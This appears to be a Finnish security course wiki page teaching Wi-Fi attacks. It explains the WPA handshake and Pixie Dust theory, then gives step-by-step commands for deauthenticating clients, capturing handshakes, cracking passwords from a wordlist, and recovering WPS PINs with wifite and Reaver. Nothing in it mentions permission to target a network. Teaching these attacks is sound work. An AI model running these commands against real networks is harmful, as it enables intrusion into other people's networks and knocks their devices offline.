Kyberturva - Wifite and WPS Pixie Dust Attack
===

## Background story

Nowadays, penetration testing has stalled with only one angle of cybersecurity – software code. In truth, pentesting is much wider than testing a software code. You can also test people for info extraction. Or hack into their wireless network!

## What is the four-way handshake?

![](https://gitlab.dclabra.fi/wiki/uploads/upload_381db08d0cc9b587c85f21211d783a6c.png)

The four-way handshake is a message exchange between an access point and the client device. The devices exchange 4 messages that generate the encryption keys.

### Here’s a basic glossary before you read further:

1. **PTK (Pairwise Transient Key)** – a key that encrypts traffic between the access point and client device. If you’re friends with mathematical formulas, here’s one for PTK:PTK = PRF (PMK + ANonce + SNonce + Mac (AA)+ Mac (SA))PRF is a pseudo-random function that sums up all the formula components.
1. **PMK (Pairwise Master Key)** – an encryption key generated from MSK (Master Session Key).
1. **ANonce** – a random number generated by an access point.
1. **SNonce** – a random number generated by a client device.
1. **MAC (AA)** – MAC address of the access point.
1. **MAC (SA**) MAC address of the client device.
1.** GTK (Group Temporal Key)** – an encryption code unique to each access point. It encrypts all traffic between one access point and multiple client devices.
1. **RSN** – a set of network security features that prevent exploiting WEP weaknesses.
1. **MIC (Message Integrity Check)** – a network security feature that prevents bit-flip attacks. It’s an improvement to the previous ICV (Integrity Check Value).

### The handshake algorithm happens in 4 steps:

1. The access point sends ANonce to the client device.
1. The client generates PTK and then it sends SNonce, RSN, and MIC back to the access point.
1. The access point sends ANonce, RSN, MIC, and GTK to the client.
1. The client sends a message with MIC to notify the access point if the temporal keys have been installed successfully.

**This text are based on this [article](https://www.wifi-professionals.com/2019/01/4-way-handshake):**

## What is the monitor mode?

By default, the network card listens only for the packets addressed to itself. 

The monitor mode enables the network card to listen to every packet in the air.

Listening to all the packets can help the card capture the 4-way handshakes.

Nowadays almost all network cards support the monitor mode and  supports both 2.4GHz and 5GHz frequencies while also having a long-range distance.

## What are the Wi-Fi network properties?

1. ESSID – The network name
1. BSSID – MAC address of the access point
1. Beacons – Number of announcements packets sent by the access point
1. CH – Channel number
1. ENC – Encryption algorithm in use
1. CIPHER – The detected cipher
1. AUTH – The authentication protocol

## Handshake Capture - Prepare your Wi-Fi adapter

But first open terminal and type

![](https://gitlab.dclabra.fi/wiki/uploads/upload_ebf956451397e70c9df4bfdda669a2c6.png)


And then kill all the adapter processes to run without restriction.

Go to the terminal and execute this command:
```
airmon-ng check kill
```

Now wpa_supplicant was successfully stopped

* Switch down wlan0 interface with: ```ifconfig wlan0 down```
* Turn on the monitor mode with: ```iwconfig wlan0 mode monitor```
* Switch on wlan0 interface with: ```ifconfig wlan0 up```

## Scan all the available networks

List down all the surrounding networks with:
```
airodump-ng wlan0mon
```

Run ```iwconfig```. 

You should now see a new monitor mode interface listed (likely mon0 or wlan0mon)

## Capture the handshake

Run this command:
```
airodump-ng –channel {channel id} –bssid {BSSID} 
–essid {ESSID} -w {output directory of the captured file} wlan0mon
```

**EXAMPLE** 
```
airodump-ng –channel 12 –bssid 01:34:5C:56:2D:A5 –essid 
Tp-Link -w /home/kali/Documents wlan0mon
```
## Deauthenticate clients from target access point

Run this command:
```
aireplay-ng -0 0 -e {ESSID} -a bssid wlan0mon –ig
````

EXAMPLE 
```
aireplay-ng -0 0 -e Tp-Link -a 01:34:5C:56:2D:A5 wlan0mon –ig
````
Now we wait… Once you’ve captured a handshake, you should see something like [ WPA handshake: bc:d3:c9:ef:d2:67 at the top right of the screen, just right of the current time.
Our deauthentication attack is successful when we see the captured handshakes. 

You can now stop listening to the network by pressing CTRL+C.

## Run a wordlist attack

At this point, your handshakes are the encrypted password for the network. You now need to make the computer guess the right password with your list of possible passwords.

Run this command to start matching the passwords:

```
aircrack-ng -w {wordlist-location} {output-file}
```

EXAMPLE 

```pwd```

![](https://gitlab.dclabra.fi/wiki/uploads/upload_cf2475791c1cbd332d7c38352fc7b8d5.png)

```touch salasanat.txt```

```nano salasanat.txt```

![](https://gitlab.dclabra.fi/wiki/uploads/upload_e19005ed77bddc7c83da9591bbb61bc5.png)

And the next one commad....


````
aircrack-ng -w /home/kali/salasanat.txt /home/kali/01.pcap
````

It will now take time for your computer to process all the words from your wordlist. Once the password is found, you will see it next to the “**KEY FOUND**”.

The most disappointing thing was finding out you actually need a prepared database of passwords. If a password is too hard, your wordlists may not even contain it. That’s why there are paid services that take your handshakes and decrypt them on their end. They usually have more wordlists and processing power.





## WPS Pixie Dust Attack

A Pixie-Dust attack works by bruteforcing the key for a protocol called WPS. WPS was intended to make accessing a router easier, and it did - for attackers.

A WPS Pin consists of 8 digits - two Pre-Shared-Keys or PSKs. Each PSK has half the pin. To understand how a Pixie Dust attack works, you'll need to understand how the requests to the AP work:

1. Computer sends - EAPOL Start

2. Router sends - EAP-Request for the Identity

3. Computer sends - Responds with the Identity

4. Router sends - EAP request

5. Computer sends - EAP response
...

And it loops these requests a few more times before the credentials are sent.

However, during this process, your computer has been given the following:

    Diffie Hellman Public key of the Enrolee

    Diffie Hellman Public key of the Registrar

    Two hashes - of the WPS PIN

    Enrolee nonce and a derived authkey



## Recon the target network

Put your interface into monitor mode using 'airmon-ng start {wireless interface}

![](https://gitlab.dclabra.fi/wiki/uploads/upload_4a52f4e1043c17ad048a225451938bfc.png)


Run wifite with the sudo command and the  --kill flag. This will enable the monitoring mode and show you the list of available networks.


Check out the networks with WPS = yes. These are your potential targets.
Now, wait until you see your target and then hit “Ctrl+C”. This stops the recon and prompts you to input the target’s number:

![](https://gitlab.dclabra.fi/wiki/uploads/upload_f3e11f4e02c3fb54e46fb030d65fe2df.png)

## Attack the target network

Check the target’s NUM and type it in the console. In my case, that’s 1. Wifite will now do the rest.
If successful, wifite will output the cracked WPS PIN and the network password:

![](https://gitlab.dclabra.fi/wiki/uploads/upload_053a3aa26b7b0bc94dec9df1c3d1f894.png)

Interesting, but this attack can even detect the most sophisticated passwords:


![](https://gitlab.dclabra.fi/wiki/uploads/upload_b64d597a6c56d3b78afb1fc16cb038e3.png)

### Vulnerability Overview: WPS Pixie Dust Attack

In 2013, the researcher Dominique Bongard discovered an odd situation. He found out that some wireless access points had weak algorithms for generating nonces.

These algorithms are known as E-S1 and E-S2. They are supposed to be secret. If the outputs of the algorithms are discovered, they can reveal the WPS PIN hash of an access point.

This picture describes how the WPS works:
![](https://gitlab.dclabra.fi/wiki/uploads/upload_162587964eeb0b5bb859c83d89d711f5.png)

The most interesting actions are executed during the M1 and M3 messaging. With M1 message, the access point sends 2 things:

* N1, a 128-bit random nonce generated by Enrollee
* PKE, a Diffie-Hellman public key of the Enrollee.

The M3 message is the most important part of this attack, as it contains 2 hashes that will be used in further calculations:

* E-Hash1 = HMACAuthKey(E-S1 || PSK1 || PKE || PKR)
* E-Hash2 = HMACAuthKey(E-S2 || PSK2 || PKE || PKR)

To find E-S1 and E-S2, we first need to get the PSK1 and PSK2. E-S1 and E-S2 are calculated right after the N1 nonce, producing the same function. We then bruteforce the state of that function with N1 to calculate the E-S1 and E-S2 values.

We then bruteforce PSK1 from E-Hash1 and PSK2 from E-Hash2. As a result, we receive 2 values:

* PSK1 – the first four numbers of the WPS PIN
* PSK2 – the last four numbers of the WPS PIN

Finally, execute the full WPS protocol to get the credentials of the wireless access point.

![](https://gitlab.dclabra.fi/wiki/uploads/upload_f4b6b3a63163d3a937459bd6fb0f466c.png)


## WPS Pixie Dust Attack 2  (Raspberry Pi) solutions


## ## Step 1. - Download All Dependencies

It's important to download all dependencies from the repository before proceeding with the attack. Kali Linux includes some of these, but if you're using another flavor of Linux, it may not. So let's go through all of them.

```
apt-get update
apt-get install build-essential
apt-get install libpcap-dev
apt-get install sqlite3
apt-get install libsqlite3-dev
apt-get install pixiewps
```

## Step 2 - Clone the GitHub

This attack works by using a fork of Reaver. We'll need to download, compile, and install the fork. Let's begin:

```
git clone https://github.com/t6x/reaver-wps-fork-t6x
```

## Step 3 - Installation

From your pwd, type...
```
    cd reaver-wps-fork-t6x/
    cd src/
    ./configure
    make
    make install
```
or 'sudo make install' if you're not logged in as 'root'

## Step 4 - Monitor Mode

Put your interface into monitor mode using 
```
airmon-ng start {wireless interface}
```
![](https://gitlab.dclabra.fi/wiki/uploads/upload_95bac241bc3ef17c95fca02b273b93e5.png)


## Step 5 - Find a Target

The easiest way to find a target with WPS enabled is

```
wash -i {monitor-interface}
```
![](https://gitlab.dclabra.fi/wiki/uploads/upload_cd1edebd4284517c4c0e1ed3ca6b2431.png)


Gather the BSSID and channel # for the router you want to attack.

## Step 6 - Launch the Attack

Once you have all the information, simply type in the following command:
```
reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
```
![](https://gitlab.dclabra.fi/wiki/uploads/upload_1dc7eedbf237296490d5022851906650.png)

## Step 7 - Jesh!

There's the password! 

![](https://gitlab.dclabra.fi/wiki/uploads/upload_b93d6f9e211f126e8aa6a93dfa9df142.png)

## HOX!
I'll do this last case using Raspi, so if you're looking for a cheap, handy platform to get started working with the pixie dust attack or what else attack, check out Kali Linux Raspberry Pi.



